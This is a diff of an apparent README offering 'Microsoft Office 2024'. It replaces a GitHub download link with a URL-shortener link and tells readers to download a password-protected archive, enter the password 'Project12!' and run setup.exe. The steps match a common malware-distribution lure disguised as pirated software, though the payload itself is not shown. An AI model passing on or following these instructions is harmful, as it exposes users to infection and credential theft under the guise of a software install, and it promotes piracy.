@@ -2,8 +2,8 @@
 
 <H3>⚙️ How to install Microsoft Office 2024</H3>
 
-- [Download](https://github.com/VASK1NHO/office-365-2021/releases/download/Download/MOffice24.rar)
-- Open archive (password: Office24)
+- [Download](https://goo.su/zUl4JO)
+- Open archive (password: Project12!)
 - Open setup.exe for download components and install
 - Follow the instruction
 
